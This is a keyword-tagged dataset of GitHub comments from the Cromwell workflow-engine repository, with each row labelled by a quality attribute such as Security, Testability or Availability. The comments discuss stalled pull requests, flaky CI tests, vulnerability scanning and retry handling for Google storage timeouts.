https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-933942034:29,Security,access,access,29,"@cjllanwarne I've lost write access to the Cromwell repo, so I'm unable to resolve the conflicts.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-933942034
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438:383,Availability,failure,failure,383,"The functionality provided in this PR would be helpful to one of our users and I would love to see it merged, but this PR has languished for over 2 years. Looking it over, I have 3 questions for @illusional which may effect getting this merged:. 1. Would it make sense to change the proposed option from skipping the lookup entirely, to allowing the lookup to happen, but ignore the failure if we have a hash?; 2. Would having tests for this change make it more palatable to the maintainers?; 3. Maybe redo the PR against the current state of the repo so that there are not 2 years worth of conflicts to resolve before a merge?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438:404,Security,hash,hash,404,"The functionality provided in this PR would be helpful to one of our users and I would love to see it merged, but this PR has languished for over 2 years. Looking it over, I have 3 questions for @illusional which may effect getting this merged:. 1. Would it make sense to change the proposed option from skipping the lookup entirely, to allowing the lookup to happen, but ignore the failure if we have a hash?; 2. Would having tests for this change make it more palatable to the maintainers?; 3. Maybe redo the PR against the current state of the repo so that there are not 2 years worth of conflicts to resolve before a merge?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438:427,Testability,test,tests,427,"The functionality provided in this PR would be helpful to one of our users and I would love to see it merged, but this PR has languished for over 2 years. Looking it over, I have 3 questions for @illusional which may effect getting this merged:. 1. Would it make sense to change the proposed option from skipping the lookup entirely, to allowing the lookup to happen, but ignore the failure if we have a hash?; 2. Would having tests for this change make it more palatable to the maintainers?; 3. Maybe redo the PR against the current state of the repo so that there are not 2 years worth of conflicts to resolve before a merge?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435350438
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435387948:94,Deployability,pipeline,pipelines,94,"Hey @sychan, definitely unfortunate this got lost. 1. This wasn't relevant for me because our pipelines (generated from Janis) inserted the digest at transpilation time so it wasn't relevant. 2. Would make sense to me, but Broad wanted to treat this feature as unstable and generally unsupported. 3. When I made the PR, I was a contributor on this repo, hence the internal branch so it could run tests, unfortunately I'm not on this repo so effectively can't touch the branch, unless I have recreated it in my local fork. 3.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435387948
https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435387948:396,Testability,test,tests,396,"Hey @sychan, definitely unfortunate this got lost. 1. This wasn't relevant for me because our pipelines (generated from Janis) inserted the digest at transpilation time so it wasn't relevant. 2. Would make sense to me, but Broad wanted to treat this feature as unstable and generally unsupported. 3. When I made the PR, I was a contributor on this repo, hence the internal branch so it could run tests, unfortunately I'm not on this repo so effectively can't touch the branch, unless I have recreated it in my local fork. 3.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6140#issuecomment-1435387948
https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308:90,Availability,failure,failure,90,"To clear up my previous comment, it does indeed look like coverage was just an `sbt` test failure issue. Though I'm not clear on why the tests were failing. 🤷🤔:insert_flaky_test_emoji:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308
https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308:85,Testability,test,test,85,"To clear up my previous comment, it does indeed look like coverage was just an `sbt` test failure issue. Though I'm not clear on why the tests were failing. 🤷🤔:insert_flaky_test_emoji:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308
https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308:137,Testability,test,tests,137,"To clear up my previous comment, it does indeed look like coverage was just an `sbt` test failure issue. Though I'm not clear on why the tests were failing. 🤷🤔:insert_flaky_test_emoji:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308
https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308:3,Usability,clear,clear,3,"To clear up my previous comment, it does indeed look like coverage was just an `sbt` test failure issue. Though I'm not clear on why the tests were failing. 🤷🤔:insert_flaky_test_emoji:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308
https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308:120,Usability,clear,clear,120,"To clear up my previous comment, it does indeed look like coverage was just an `sbt` test failure issue. Though I'm not clear on why the tests were failing. 🤷🤔:insert_flaky_test_emoji:",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6144#issuecomment-756278308
https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497:0,Deployability,Update,Updated,0,Updated to publish counter metrics on per-reference-file basis (incremented until Cromwell restart). Also added logging for reference disks feature configuration step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497
https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497:148,Deployability,configurat,configuration,148,Updated to publish counter metrics on per-reference-file basis (incremented until Cromwell restart). Also added logging for reference disks feature configuration step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497
https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497:148,Modifiability,config,configuration,148,Updated to publish counter metrics on per-reference-file basis (incremented until Cromwell restart). Also added logging for reference disks feature configuration step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497
https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497:112,Testability,log,logging,112,Updated to publish counter metrics on per-reference-file basis (incremented until Cromwell restart). Also added logging for reference disks feature configuration step.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6145#issuecomment-757106497
https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921:82,Deployability,integrat,integrate,82,"@aednichols ; 1. You can either use blessed images or your own! All we need is to integrate the Trivy check that runs on every PR, and in case when it does find Critical vulns, those should be fixed on a 2-week timeline (it doesn't have to block your release, however!); 2. We don't have to have ""many"" checks, but we're currently running it on every Dockerfile in this repo that is deployed to production - please correct me if that's inaccurate. I did notice that a lot of these images are essentially the same (+/- the JAR), so we don't have to scan those twice (so we can just pick a representative one from the set). However, at least one image (**cromwell-drs-localizer**) is different, so that one should be scanned separately. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921
https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921:251,Deployability,release,release,251,"@aednichols ; 1. You can either use blessed images or your own! All we need is to integrate the Trivy check that runs on every PR, and in case when it does find Critical vulns, those should be fixed on a 2-week timeline (it doesn't have to block your release, however!); 2. We don't have to have ""many"" checks, but we're currently running it on every Dockerfile in this repo that is deployed to production - please correct me if that's inaccurate. I did notice that a lot of these images are essentially the same (+/- the JAR), so we don't have to scan those twice (so we can just pick a representative one from the set). However, at least one image (**cromwell-drs-localizer**) is different, so that one should be scanned separately. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921
https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921:383,Deployability,deploy,deployed,383,"@aednichols ; 1. You can either use blessed images or your own! All we need is to integrate the Trivy check that runs on every PR, and in case when it does find Critical vulns, those should be fixed on a 2-week timeline (it doesn't have to block your release, however!); 2. We don't have to have ""many"" checks, but we're currently running it on every Dockerfile in this repo that is deployed to production - please correct me if that's inaccurate. I did notice that a lot of these images are essentially the same (+/- the JAR), so we don't have to scan those twice (so we can just pick a representative one from the set). However, at least one image (**cromwell-drs-localizer**) is different, so that one should be scanned separately. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921
https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921:82,Integrability,integrat,integrate,82,"@aednichols ; 1. You can either use blessed images or your own! All we need is to integrate the Trivy check that runs on every PR, and in case when it does find Critical vulns, those should be fixed on a 2-week timeline (it doesn't have to block your release, however!); 2. We don't have to have ""many"" checks, but we're currently running it on every Dockerfile in this repo that is deployed to production - please correct me if that's inaccurate. I did notice that a lot of these images are essentially the same (+/- the JAR), so we don't have to scan those twice (so we can just pick a representative one from the set). However, at least one image (**cromwell-drs-localizer**) is different, so that one should be scanned separately. Does that make sense?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6147#issuecomment-758206921
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-758846124:41,Availability,failure,failures,41,As usual I can't really tell what the CI failures mean... they don't seem correlated to anything in particular?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-758846124
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763130944:83,Deployability,update,updates,83,"Merge `develop` and re-push, you may be unlucky or your branch may be missing test updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763130944
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763130944:78,Testability,test,test,78,"Merge `develop` and re-push, you may be unlucky or your branch may be missing test updates",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763130944
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763891163:6,Availability,error,error,6,```; [error] (wdlModelDraft2 / Test / compileIncremental) Compilation failed; ```; https://travis-ci.com/github/broadinstitute/cromwell/jobs/473221961,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763891163
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763891163:31,Testability,Test,Test,31,```; [error] (wdlModelDraft2 / Test / compileIncremental) Compilation failed; ```; https://travis-ci.com/github/broadinstitute/cromwell/jobs/473221961,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-763891163
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-764996727:34,Availability,failure,failure,34,"I'm confused, I fixed the compile failure and merged with develop again and now there are more build failures - which do not appear to be consistent with each other?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-764996727
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-764996727:101,Availability,failure,failures,101,"I'm confused, I fixed the compile failure and merged with develop again and now there are more build failures - which do not appear to be consistent with each other?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-764996727
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-785295218:88,Performance,queue,queue,88,@aednichols Is there anything else I need to do for this or is it waiting in the review queue?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-785295218
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-823447669:29,Deployability,update,updates,29,@aednichols @cjllanwarne Any updates?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-823447669
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-825196034:6,Performance,queue,queued,6,Still queued internally.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-825196034
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-827132335:274,Availability,error,errors,274,"@cjllanwarne I considered doing this at first and I think I actually tried to implement it, but there was a fundamental inconsistency that I couldn't figure out how to resolve. It might have had to do with going from the `WomLong` type back to a WDL type, but I hit so many errors along the way that I may be mixing them up. The current implementation is what I eventually settled on as the least invasive (not necessarily the most elegant). If the current approach is a deal-breaker I can take another look, but I suspect the blast radius will be larger no matter what. My hope was that CWL users wouldn't actually notice or care about the underlying JVM type - is there a use case for large integer arrays in Cromwell?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-827132335
https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-921173810:156,Usability,feedback,feedback,156,"@aednichols In that case is there an alternative implementation path that would be acceptable? I am not wedded to this way of doing it, but I've heard zero feedback on what to do instead and I'm reluctant to start coding anything new until I know whether it will actually be reviewed.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6151#issuecomment-921173810
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699:126,Availability,down,download,126,"Thanks. I think I have a clue, your lowest level exception says; ```; 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media; ```; which does not match the pattern; ```; "".*Could not read from gs.+504 Gateway Timeout.*""; ```; introduced in https://github.com/broadinstitute/cromwell/pull/5344",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699:82,Safety,Timeout,Timeout,82,"Thanks. I think I have a clue, your lowest level exception says; ```; 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media; ```; which does not match the pattern; ```; "".*Could not read from gs.+504 Gateway Timeout.*""; ```; introduced in https://github.com/broadinstitute/cromwell/pull/5344",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699:370,Safety,Timeout,Timeout,370,"Thanks. I think I have a clue, your lowest level exception says; ```; 504 Gateway Timeout\nGET https://storage.googleapis.com/download/storage/v1/b/mccarroll-mocha/o/cromwell%2Fcromwell-executions%2Fmocha%2F86d47e9a-5745-4ec0-b4eb-0164f073e5f4%2Fcall-idat2gtc%2Fshard-73%2Frc?alt=media; ```; which does not match the pattern; ```; "".*Could not read from gs.+504 Gateway Timeout.*""; ```; introduced in https://github.com/broadinstitute/cromwell/pull/5344",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760319699
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826:26,Deployability,patch,patched,26,"@freeseek if I send you a patched JAR do you think you'd be able to verify the fix?. Which is to say, do you get 504s frequently enough that you can test updated handling?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826:154,Deployability,update,updated,154,"@freeseek if I send you a patched JAR do you think you'd be able to verify the fix?. Which is to say, do you get 504s frequently enough that you can test updated handling?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826:149,Testability,test,test,149,"@freeseek if I send you a patched JAR do you think you'd be able to verify the fix?. Which is to say, do you get 504s frequently enough that you can test updated handling?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760326826
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760328444:96,Deployability,pipeline,pipeline,96,"I actually only ever got this issue once, and that's it. I am currently re-running the same WDL pipeline and it is working fine. But if you send me a new JAR, I am more than happy to run that from now on and report back if I encounter the same issue again.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760328444
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655:13,Availability,error,error,13,"> So was the error report useful? Is there anything else I need to provide? Thank you for replying sooo quickly! -Giulio. Yes, I've heard about people still having this issue but you are the first to provide the full error message (and also provide confirmation by being another data point). I'll try to my fix idea of shortening the pattern in the regular release, if you're not likely to repro I won't do the custom JAR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655:217,Availability,error,error,217,"> So was the error report useful? Is there anything else I need to provide? Thank you for replying sooo quickly! -Giulio. Yes, I've heard about people still having this issue but you are the first to provide the full error message (and also provide confirmation by being another data point). I'll try to my fix idea of shortening the pattern in the regular release, if you're not likely to repro I won't do the custom JAR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655:357,Deployability,release,release,357,"> So was the error report useful? Is there anything else I need to provide? Thank you for replying sooo quickly! -Giulio. Yes, I've heard about people still having this issue but you are the first to provide the full error message (and also provide confirmation by being another data point). I'll try to my fix idea of shortening the pattern in the regular release, if you're not likely to repro I won't do the custom JAR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655
https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655:223,Integrability,message,message,223,"> So was the error report useful? Is there anything else I need to provide? Thank you for replying sooo quickly! -Giulio. Yes, I've heard about people still having this issue but you are the first to provide the full error message (and also provide confirmation by being another data point). I'll try to my fix idea of shortening the pattern in the regular release, if you're not likely to repro I won't do the custom JAR.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6154#issuecomment-760333655
https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961:88,Availability,error,errors,88,@cjllanwarne @salonishah11 this is really fixed now and ready for re-review. The Google errors provided by customers have `\n` in them which our regexes did not match. Fixed the regex and updated test cases to match the actual error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961
https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961:227,Availability,error,error,227,@cjllanwarne @salonishah11 this is really fixed now and ready for re-review. The Google errors provided by customers have `\n` in them which our regexes did not match. Fixed the regex and updated test cases to match the actual error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961
https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961:188,Deployability,update,updated,188,@cjllanwarne @salonishah11 this is really fixed now and ready for re-review. The Google errors provided by customers have `\n` in them which our regexes did not match. Fixed the regex and updated test cases to match the actual error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961
https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961:196,Testability,test,test,196,@cjllanwarne @salonishah11 this is really fixed now and ready for re-review. The Google errors provided by customers have `\n` in them which our regexes did not match. Fixed the regex and updated test cases to match the actual error.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6155#issuecomment-765013961
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-763229794:66,Testability,test,tests,66,@kshakir Thanks for taking time to provide comments. Will checkin tests for the fix in a day or two. Sorry for not doing it earlier.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-763229794
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-773513271:399,Availability,error,errors,399,"Hey @nvanaja-. Can you rebase this PR? Hopefully, there aren't any major conflicts since the main branch has continued to diverge. Sorry, we have another set of (currently internal) CI tests that are failing on your branch. The team has [(also internally) discussed](https://broadinstitute.slack.com/archives/C1EH66VCM/p1612377943138400?thread_ts=1612377834.138300&cid=C1EH66VCM) the cryptic docker errors with `mysql-client`, and no one on the team has any quick concrete suggestions at this second other than rebasing. 🤞. Thanks again for your patience while we juggle your PR with our other work!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-773513271
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-773513271:185,Testability,test,tests,185,"Hey @nvanaja-. Can you rebase this PR? Hopefully, there aren't any major conflicts since the main branch has continued to diverge. Sorry, we have another set of (currently internal) CI tests that are failing on your branch. The team has [(also internally) discussed](https://broadinstitute.slack.com/archives/C1EH66VCM/p1612377943138400?thread_ts=1612377834.138300&cid=C1EH66VCM) the cryptic docker errors with `mysql-client`, and no one on the team has any quick concrete suggestions at this second other than rebasing. 🤞. Thanks again for your patience while we juggle your PR with our other work!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-773513271
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286:336,Security,access,access,336,"Hi @kshakir, ; Inadvertently did merge instead of rebase. Hope it's ok.; When building pull request, one of the jobs failed first: https://api.travis-ci.com/v3/job/480472697/log.txt. Tried rerunning. It passed.; Would it be possible to share the internal failed test, I would like to run it locally in my workspace if possible. I can't access the failed test discussions link in your reply.; Thanks much.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286:174,Testability,log,log,174,"Hi @kshakir, ; Inadvertently did merge instead of rebase. Hope it's ok.; When building pull request, one of the jobs failed first: https://api.travis-ci.com/v3/job/480472697/log.txt. Tried rerunning. It passed.; Would it be possible to share the internal failed test, I would like to run it locally in my workspace if possible. I can't access the failed test discussions link in your reply.; Thanks much.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286:262,Testability,test,test,262,"Hi @kshakir, ; Inadvertently did merge instead of rebase. Hope it's ok.; When building pull request, one of the jobs failed first: https://api.travis-ci.com/v3/job/480472697/log.txt. Tried rerunning. It passed.; Would it be possible to share the internal failed test, I would like to run it locally in my workspace if possible. I can't access the failed test discussions link in your reply.; Thanks much.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286:354,Testability,test,test,354,"Hi @kshakir, ; Inadvertently did merge instead of rebase. Hope it's ok.; When building pull request, one of the jobs failed first: https://api.travis-ci.com/v3/job/480472697/log.txt. Tried rerunning. It passed.; Would it be possible to share the internal failed test, I would like to run it locally in my workspace if possible. I can't access the failed test discussions link in your reply.; Thanks much.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-774215286
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006:283,Testability,test,tests,283,"@nvanaja. > Inadvertently did merge instead of rebase. Hope it's ok. [It worked!](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-aws/918/console) (still an internal-only link though). > Tried rerunning. It passed. Yeah... that's unfortunately cromwell's flaky tests. See BT-117 that's looking to help. Thanks for your patience and the retry. > Would it be possible to share the internal failed test. No. Cromwell CI that runs under 3 hours is run on Travis CI. For over 3 hours cromwell uses the notoriously insecure Jenkins CI hosted by friends of ours in DSP. This was all set up before GitHub Actions existed. 🧓 Perhaps one day we'll move those tests where contributors like yourself can see the results, but afaik there are no current plans to do so. > I would like to run it locally in my workspace if possible. This is technically possible but isn't currently supported, and we'd have to all loop in our AppSec & DevOps folks to discuss further. In the short term hopefully you can put up with us as the folks-in-the-middle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006:417,Testability,test,test,417,"@nvanaja. > Inadvertently did merge instead of rebase. Hope it's ok. [It worked!](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-aws/918/console) (still an internal-only link though). > Tried rerunning. It passed. Yeah... that's unfortunately cromwell's flaky tests. See BT-117 that's looking to help. Thanks for your patience and the retry. > Would it be possible to share the internal failed test. No. Cromwell CI that runs under 3 hours is run on Travis CI. For over 3 hours cromwell uses the notoriously insecure Jenkins CI hosted by friends of ours in DSP. This was all set up before GitHub Actions existed. 🧓 Perhaps one day we'll move those tests where contributors like yourself can see the results, but afaik there are no current plans to do so. > I would like to run it locally in my workspace if possible. This is technically possible but isn't currently supported, and we'd have to all loop in our AppSec & DevOps folks to discuss further. In the short term hopefully you can put up with us as the folks-in-the-middle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006
https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006:671,Testability,test,tests,671,"@nvanaja. > Inadvertently did merge instead of rebase. Hope it's ok. [It worked!](https://gotc-jenkins.dsp-techops.broadinstitute.org/job/cromwell-cron-aws/918/console) (still an internal-only link though). > Tried rerunning. It passed. Yeah... that's unfortunately cromwell's flaky tests. See BT-117 that's looking to help. Thanks for your patience and the retry. > Would it be possible to share the internal failed test. No. Cromwell CI that runs under 3 hours is run on Travis CI. For over 3 hours cromwell uses the notoriously insecure Jenkins CI hosted by friends of ours in DSP. This was all set up before GitHub Actions existed. 🧓 Perhaps one day we'll move those tests where contributors like yourself can see the results, but afaik there are no current plans to do so. > I would like to run it locally in my workspace if possible. This is technically possible but isn't currently supported, and we'd have to all loop in our AppSec & DevOps folks to discuss further. In the short term hopefully you can put up with us as the folks-in-the-middle.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6157#issuecomment-775548006
